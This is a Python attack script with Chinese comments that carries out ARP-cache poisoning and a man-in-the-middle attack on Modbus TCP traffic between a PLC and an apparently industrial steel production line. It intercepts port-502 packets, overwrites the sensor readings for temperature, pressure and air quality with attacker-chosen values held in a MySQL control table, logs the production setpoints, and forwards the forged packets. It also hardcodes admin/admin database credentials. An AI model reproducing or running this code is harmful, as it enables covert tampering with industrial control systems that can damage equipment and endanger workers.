import mysql
from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
import os
import time
import threading
import struct
import binascii
from scapy.layers.inet import TCP, IP
from mysql.connector import Error, cursor
from scapy.layers.l2 import ARP, getmacbyip, Ether

db_config = {
    "host": "10.4.1.184",      # MySQL 服务器地址
    "user": "admin",           # 数据库用户名
    "password": "admin",       # 数据库密码
    "database": "renren_fast",  # 数据库名
    "port": 3306              # 指定 MySQL 端口
}

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """恢复 ARP 表"""
    print("[INFO] 恢复 ARP 表...")
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
    print("[INFO] ARP 恢复完成")


def disable_ip_forwarding():
    """禁用 IP 转发"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def connect_to_database():
    """连接到 MySQL 数据库"""
    try:
        connection = mysql.connector.connect(
            host=db_config['host'],
            user=db_config['user'],
            password=db_config['password'],
            database=db_config['database']
        )
        if connection.is_connected():
            print("成功连接到数据库")
            return connection
    except Error as e:
        print(f"连接数据库时出错: {e}")
        return None


def close_connection(connection):
    """关闭数据库连接"""
    if connection.is_connected():
        connection.close()
        print("数据库连接已关闭")


def read_data_from_db(connection):
    """从数据库中wlgj_wyk读取温度、压力、空气质量和loag"""
    try:
        cursor = connection.cursor()

        # 执行查询
        query = """SELECT temperature, pressure, air_quality, loag
                   FROM wlgj_wyk
                   LIMIT 1"""  # 假设只读取一条记录，可以根据需要调整

        cursor.execute(query)
        result = cursor.fetchone()  # 获取查询结果（返回一个元组）

        if result:
            temperature, pressure, air_quality, loag = result
            print(f"读取的数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}, loag={loag}")
            return temperature, pressure, air_quality, loag
        else:
            print("没有找到数据")
            return None

    except Error as e:
        print(f"读取数据时出错: {e}")
        return None
    finally:
        cursor.close()  # 关闭游标

def read_data_from_db_tgzm(connection):
    """从数据库中获取id=1的记录"""
    try:
        cursor = connection.cursor()
        query = """SELECT iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag
                      FROM wlgj_read_tgzm
                      WHERE id = 1
                      LIMIT 1"""
        cursor.execute(query)
        result = cursor.fetchone()  # 获取一行数据
        if result:
            iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag = result
            print(
                f"读取的数据: 铁水={iron_water}, 钢板={steel_plate}, 轧辊={roller}, 模具={mold}, 传送带1={conveyor_belt1}, 传送带2={conveyor_belt2}, loag={loag}")
            return iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag
        else:
            print("没有找到id=1的记录")
            return None
    except Error as e:
        print(f"查询数据时出错: {e}")
        return None
    finally:
        cursor.close()

def insert_data_into_db(connection, temperature, pressure, air_quality):
    """将新的传感器数据插入到表中"""
    try:
        cursor = connection.cursor()

        # 插入数据
        query_insert = """INSERT INTO sensor_readings (temperature, pressure, air_quality)
                          VALUES (%s, %s, %s)"""
        cursor.execute(query_insert, (temperature, pressure, air_quality))

        connection.commit()  # 提交事务
        print(f"成功插入数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")

    except Error as e:
        print(f"插入数据时出错: {e}")
    finally:
        cursor.close()  # 关闭游标


def update_data_in_db(connection, temperature, pressure, air_quality):
    """更新主键为id=1的记录"""
    try:
        # 检查是否存在 id=1 的记录
        cursor = connection.cursor()
        query = """UPDATE sensor_readings
                           SET temperature = %s, pressure = %s, air_quality = %s
                           WHERE id = 1"""
        cursor.execute(query, (temperature, pressure, air_quality))
        connection.commit()  # 提交事务
        if cursor.rowcount > 0:
            print(f"成功更新数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
        else:
            print("没有找到id=1的记录进行更新")
    except Error as e:
        print(f"更新数据时出错: {e}")
    finally:
        cursor.close()  # 关闭游标


def insert_data_into_db_tgzm(connection, iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2):
    """向 wlgj_print_tgzm 表中插入6个值及 id"""
    try:
        cursor = connection.cursor()
        query = """INSERT INTO wlgj_print_tgzm (iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2)
                       VALUES (%s, %s, %s, %s, %s, %s)"""
        cursor.execute(query, (iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2))
        connection.commit()  # 提交事务
        #print("数据插入成功")
    except Error as e:
        print(f"插入数据时出错: {e}")
    finally:
        cursor.close()

def print_data_tgzm(a1, a2, a3, a4, a5, a6):
    """保存数据"""
    # 连接数据库
    connection = connect_to_database()
    if not connection:
        return
    insert_data_into_db_tgzm(connection, a1, a2, a3, a4, a5, a6)
    # 关闭连接
    close_connection(connection)
def print_data(b1, b2, b3):
    """保存数据"""
    # 连接数据库
    connection = connect_to_database()
    if not connection:
        return
    insert_data_into_db(connection, b1, b2, b3)
    # 关闭连接
    close_connection(connection)

def read_data_tgzm():
    """读取数据"""
    connection = connect_to_database()
    if not connection:
        return
    a1, a2, a3, a4, a5, a6, loag = read_data_from_db_tgzm(connection)
    # 关闭连接
    close_connection(connection)
    return a1, a2, a3, a4, a5, a6, loag
def read_data():
    """读取数据"""
    connection = connect_to_database()
    if not connection:
        return
    b1, b2, b3, loag = read_data_from_db(connection)
    # 关闭连接
    close_connection(connection)
    return b1, b2, b3, loag


def read_arp_value():
    """读取wlgj_qidong表中id=1的arp值"""
    # 连接到数据库
    connection = connect_to_database()
    if not connection:
        return None  # 如果连接失败，返回None

    try:
        # 使用SQL语句查询id=1的arp字段的值
        query = "SELECT arp FROM wlgj_qidong WHERE id = 1"
        cursor = connection.cursor()
        cursor.execute(query)

        # 获取查询结果
        result = cursor.fetchone()  # 获取一行结果
        if result:
            arp_value = result[0]  # arp字段的值
        else:
            arp_value = None  # 如果没有找到结果，返回None

        return arp_value
    finally:
        # 关闭连接
        close_connection(connection)

def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
    """发送伪造的 ARP 包"""
    # 伪造网关到目标设备的 ARP 包
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
    send(packet, iface=iface, verbose=False)
    #print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")


def save_data_in_thread(b1, b2, b3):
    """启动新线程保存数据"""
    threading.Thread(target=print_data, args=(b1, b2, b3)).start()
def parse_modbus_data(packet, sport, dport):
    """
    """
    try:
        if packet.haslayer(TCP) and len(packet[TCP].payload) > 7:  # Modbus TCP 数据包的最小长度是 7
            # 获取 Modbus TCP 数据部分（去除 MBAP header 的前 7 字节）
            modbus_zdata = bytes(packet[TCP].payload)
            payload = modbus_zdata
            #print(f"modbus数据: {modbus_zdata}")
            mbap_header = modbus_zdata[:7]  # 解析 MBAP 头部
            modbus_data = modbus_zdata[7:]  # Modbus 数据（功能码及其数据）

            # 解析 MBAP 头部
            transaction_id = int.from_bytes(modbus_data[:2], byteorder='big')  # 事务 ID
            protocol_id = int.from_bytes(modbus_data[2:4], byteorder='big')  # 协议 ID
            length = int.from_bytes(modbus_data[4:6], byteorder='big')  # 数据长度
            unit_id = modbus_data[6]  # 单元 ID

            # 输出解析的 MBAP 头部
            #print(f"MBAP Header: 事务ID: {transaction_id}, 协议ID: {protocol_id}, 长度: {length}, 单元ID: {unit_id}")

            # 解析功能码
            function_code = modbus_data[0]  # 获取功能码
            #print(f"gongnengma: {function_code}")

            # 根据不同的功能码执行操作
            if function_code == 4:  # 读取保持寄存器 (Read Holding Registers)
                if sport == 502:
                    byte_count = modbus_data[1]  # 数据字节数
                    register_values = modbus_data[2:]  # 寄存器值（后续字节为寄存器值）

                    # 输出字节数和寄存器值的十六进制表示
                    #print(f"读取保持寄存器: 字节数: {byte_count}, 寄存器值: {binascii.hexlify(register_values)}")

                    # 提取寄存器的值（每个寄存器2字节）
                    bb1 = int.from_bytes(register_values[0:2], byteorder='big')  # 温度
                    bb2 = int.from_bytes(register_values[2:4], byteorder='big')  # 压力
                    bb3 = int.from_bytes(register_values[4:6], byteorder='big')  # 空气质量

                    global b1, b2, b3, loag # 声明使用全局变量

                    #b2 = 55
                    # 打印寄存器的值
                    #print(f"wendu（K）: {b1}, yali(MN): {b2}, kongqizhiliang: {b3}")
                    #print_data(b1, b2, b3)  # 保存到数据库
                    save_data_in_thread(bb1, bb2, bb3)
                    # 从数据库中获取数据温度，
                    #xb1, xb2, xb3, loag = read_data()
                    if loag == 1:
                        # 可以对压力和温度进行修改，这个数据时设备发向plc的状态
                        #b1, b2, b3 = xb1, xb2, xb3
                        xmodbus_data = modbus_data[0:2]
                        if 1500 < bb1 < 1700 and b1 > 0:
                            bb1 = b1
                            xmodbus_data += bb1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入
                        else:
                            xmodbus_data += bb1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入

                        if bb2 != 0 and b2 > 0:
                            xmodbus_data += b2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
                        else:
                            xmodbus_data += bb2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
                        xmodbus_data += b3.to_bytes(2, byteorder='big')  # 将 b3 转为 2 字节并加入
                        #print(f"篡改数据成功")
                    else:
                        # 将 modbus_data[0:2], b1, b2, b3 组合到一起
                        xmodbus_data = modbus_data[0:2]  # 保留 modbus_data 的前两字节
                        xmodbus_data += bb1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入
                        xmodbus_data += bb2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
                        xmodbus_data += bb3.to_bytes(2, byteorder='big')  # 将 b3 转为 2 字节并加入

                    modbus_tdate = mbap_header  # MBAP header 前 7 字节
                    modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
                    payload = modbus_tdate
                    #print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")

                else:
                    return payload
                # 执行读取操作 (具体逻辑根据需要扩展)

            elif function_code == 16:  # 写多个保持寄存器 (Write Multiple Holding Registers)
                if dport == 502:
                    register_address = int.from_bytes(modbus_data[1:3], byteorder='big')

                    # 解析寄存器数量
                    register_count = int.from_bytes(modbus_data[3:5], byteorder='big')

                    # 解析字节数
                    byte_count = modbus_data[5]

                    # 解析寄存器值（接下来是寄存器的值，每个寄存器占 2 字节）
                    register_values = modbus_data[6:]

                    # 将寄存器值分成多个 2 字节的寄存器
                    a1 = int.from_bytes(register_values[0:2], byteorder='big')  # 初始铁水温度（K）
                    a2 = int.from_bytes(register_values[2:4], byteorder='big')  # 初始钢板厚度(m)
                    a3 = int.from_bytes(register_values[4:6], byteorder='big')  # 轧辊间距单位为mm，向下取整
                    a4 = int.from_bytes(register_values[6:8], byteorder='big')  # 模具温度单位为K，向下取整
                    a5 = int.from_bytes(register_values[8:10], byteorder='big')  # 传送带1速度单位为cm/s，可能是向下取整
                    a6 = int.from_bytes(register_values[10:12], byteorder='big')  # 传送带2速度单位为cm/s，可能是向下取整
                    if a6 > 63000:
                        aa6 = a6 - 65536
                    else:
                        aa6 = a6
                    # 创建线程执行 print_data_tgzm
                    print_thread = threading.Thread(target=print_data_tgzm, args=(a1, a2, a3, a4, a5, aa6))
                    print_thread.start()  # 启动线程
                    # 输出结果
                    #print(f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
                    #print(f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
                    # 这个可以对这6个变量进行修改，是plc控制生产线的初始数据
                    #xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()

                    xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
                    xmodbus_data += a1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
                    xmodbus_data += a2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
                    xmodbus_data += a3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
                    xmodbus_data += a4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
                    xmodbus_data += a5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
                    xmodbus_data += a6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
                    modbus_tdate = mbap_header  # MBAP header 前 7 字节
                    modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
                    payload = modbus_tdate
                    #print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")
                else:
                    return payload
            elif function_code == 15:  # 写多个离散输出 (Write Multiple Coils)
                if sport == 14217 and dport == 11111:
                    register_address = int.from_bytes(modbus_data[1:3], byteorder='big')
                    coil_count = int.from_bytes(modbus_data[3:5], byteorder='big')
                    byte_count = modbus_data[5]  # 数据字节数
                    coil_values = modbus_data[6:]  # 输出值
                    print(
                        f"写多个离散输出: 地址: {register_address}, 输出数量: {coil_count}, 字节数: {byte_count}, 值: {binascii.hexlify(coil_values)}")
                    # 执行写多个离散输出的操作 (具体逻辑根据需要扩展)
                else:
                    return payload
            else:
                return payload

            return payload

    except Exception as e:
        print(f"该数据包不做处理")
        return payload

def packet_callback(packet):
    """捕获流量并处理 Modbus TCP 流量"""
    try:
        if packet.haslayer(Ether):
            # 获取目的 MAC 地址
            dst_mac = packet[Ether].dst

            # 过滤条件：如果目的 MAC 地址是本机的 MAC 地址，则处理数据包
            my_mac = get_if_hwaddr(conf.iface)  # 获取本机的 MAC 地址
            if dst_mac == my_mac:
                print(f"[INFO] 捕获到目的 MAC 地址是我的数据包: {binascii.hexlify(bytes(packet)).decode()}")
                # 在这里可以添加其他处理数据包的代码
            else:
                #print(f"[INFO] 捕获到目的 MAC 地址不是我的，跳过此包")
                return
        else:
            print("[INFO] 捕获的不是以太网数据包")

        # 检查数据包是否为 IP 包
        if packet.haslayer(IP):
            # 提取 IP 层
            ip = packet[IP]
            #print(f"[INFO] 捕获到 IP 数据包:")
            #print(f" SrcIP: {ip.src}, DstIP: {ip.dst}")
            #print(f"IP 数据包 (16 进制): {binascii.hexlify(bytes(ip)).decode()}")

            # 提取 IP 数据包的负载部分并打印 16 进制
            ip_data = bytes(ip.payload)
            #print(f"IP data: {binascii.hexlify(ip_data).decode()}")

            # 检查是否包含 TCP 层
            if packet.haslayer(TCP):
                # 提取 TCP 层
                tcp = packet[TCP]
                #print(f"[INFO] 捕获到 TCP 数据包:")
                #print(f"sport: {tcp.sport}, dport: {tcp.dport}")
                #print(f"TCP header : {binascii.hexlify(bytes(tcp)).decode()}")

                # 检查 TCP 数据部分是否为空
                if len(tcp.payload) > 0:
                    #print(f"TCP date: {binascii.hexlify(bytes(tcp.payload)).decode()}")

                    tcp.payload = parse_modbus_data(packet, tcp.sport, tcp.dport)
                    # 如果 TCP 数据部分不为空，组合新的 IP 和 TCP 数据包
                    new_tcp = TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack, flags=tcp.flags,
                                  window=tcp.window, chksum=None)  # 复制 TCP 头部
                    new_ip = IP(src=ip.src, dst=ip.dst)  # 新的 IP 数据包

                    # 组合新的 IP 数据包和 TCP 数据包
                    new_ip = new_ip / new_tcp / tcp.payload

                    # 输出新的 IP 数据包的 16 进制
                    #print(f"new IP data : {binascii.hexlify(bytes(new_ip)).decode()}")
                    if ip.dst == "10.0.0.156":
                        target_mac = getmacbyip("10.0.0.156")  # 获取 10.0.0.156 的 MAC 地址
                    elif ip.dst == "10.2.1.170":
                        target_mac = getmacbyip("10.0.0.1")  # 获取 10.0.0.1 的 MAC 地址
                    else:
                        target_mac = getmacbyip(ip.dst)  # 默认获取 ip.dst 的 MAC 地址
                    # 获取目标 MAC 地址
                    if target_mac:
                        #print(f"[INFO] 目标 MAC 地址: {target_mac}")
                        # 获取网络接口并发送新的数据包
                        iface = conf.iface  # 自动选择网络接口
                        sendp(Ether(dst=target_mac) / new_ip, iface=iface, verbose=False)
                        #print(f"[INFO] 转发数据包到目标 MAC: {target_mac}")
                    else:
                        print(f"[ERROR] 无法获取目标 IP ({ip.dst}) 的 MAC 地址")
                else:
                    # 如果 TCP 数据部分为空，直接使用现有的 IP 和 TCP 数据包
                    #print("[INFO] TCP 数据部分为空，可能是控制包，直接发送原始包")
                    new_tcp = TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack, flags=tcp.flags,
                                  window=tcp.window, chksum=None)  # 复制 TCP 头部
                    new_ip = IP(src=ip.src, dst=ip.dst)  # 新的 IP 数据包

                    # 组合新的 IP 数据包和 TCP 数据包
                    new_ip = new_ip / new_tcp / tcp.payload
                    #print(f"new IP data : {binascii.hexlify(bytes(new_ip)).decode()}")
                    if ip.dst == "10.0.0.156":
                        target_mac = getmacbyip("10.0.0.156")  # 获取 10.0.0.156 的 MAC 地址
                    elif ip.dst == "10.2.1.170":
                        target_mac = getmacbyip("10.0.0.1")  # 获取 10.0.0.1 的 MAC 地址
                    else:
                        target_mac = getmacbyip(ip.dst)  # 默认获取 ip.dst 的 MAC 地址
                    # 获取目标 MAC 地址
                    if target_mac:
                        # print(f"[INFO] 目标 MAC 地址: {target_mac}")
                        # 获取网络接口并发送新的数据包
                        iface = conf.iface  # 自动选择网络接口
                        sendp(Ether(dst=target_mac) / new_ip, iface=iface, verbose=False)
                        # print(f"[INFO] 转发数据包到目标 MAC: {target_mac}")
                    else:
                        print(f"[ERROR] 无法获取目标 IP ({ip.dst}) 的 MAC 地址")
            else:
                print("[INFO] 捕获的不是 TCP 数据包")
        else:
            print("[INFO] 捕获的不是 IP 数据包")

    except Exception as e:
        print(f"[ERROR] 处理包时出错: {e}")

# 全局变量
b1 = 0
b2 = 0
b3 = 0
loag = 0
def main():
    # 配置相关信息
    global target_ip, gateway_ip
    global b1, b2, b3, loag  # 声明使用全局变量
    target_ip = "10.0.0.29"  # 替换为目标设备 IP
    gateway_ip = "10.0.0.1"  # 替换为网关 IP

    # 自动选择活动接口
    iface = conf.iface  # 使用 Scapy 自动选择活动的网络接口

    if iface is None:
        print("[ERROR] 未找到有效的网络接口")
        return

    # 获取 MAC 地址
    attacker_mac = get_if_hwaddr(iface)  # 本机 MAC 地址
    target_mac = getmacbyip(target_ip)  # 目标设备原始 MAC 地址
    gateway_mac = getmacbyip(gateway_ip)  # 网关 MAC 地址

    if target_mac is None or gateway_mac is None:
        print("[ERROR] 无法获取目标或网关的 MAC 地址")
        return

    print(f"[INFO] 目标 IP: {target_ip} ({target_mac})")
    print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
    print(f"[INFO] 攻击者 MAC: {attacker_mac}")

    # 启动一个线程捕获目标设备和网关之间的 Modbus TCP 流量
    filter = f"ether dst {attacker_mac} and tcp port 502"
    capture_thread = threading.Thread(
        target=lambda: sniff(iface=iface, filter=filter, prn=packet_callback, store=False))
    capture_thread.daemon = True  # 设置为守护线程，这样主线程退出时它也会自动结束
    capture_thread.start()


    try:
        disable_ip_forwarding()
        print("[INFO] 开始 ARP 欺骗攻击 ...")

        while True:
            # 持续发送伪造的 ARP 包
            send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
            send_arp_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, iface)
            xb1, xb2, xb3, xloag = read_data()

            # 更新全局变量
            b1 = xb1
            b2 = xb2
            b3 = xb3
            loag = xloag
            # 检查目标设备的 ARP 表是否已经修改
            observed_mac = getmacbyip(target_ip)
            if observed_mac != gateway_mac:
                print(f"[INFO] ARP 已被篡改: {observed_mac}")
            time.sleep(1)

    except KeyboardInterrupt:
        # 捕获 Ctrl+C，停止攻击
        print("[INFO] 停止攻击，恢复 ARP 表 ...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        disable_ip_forwarding()


if __name__ == "__main__":
    main()
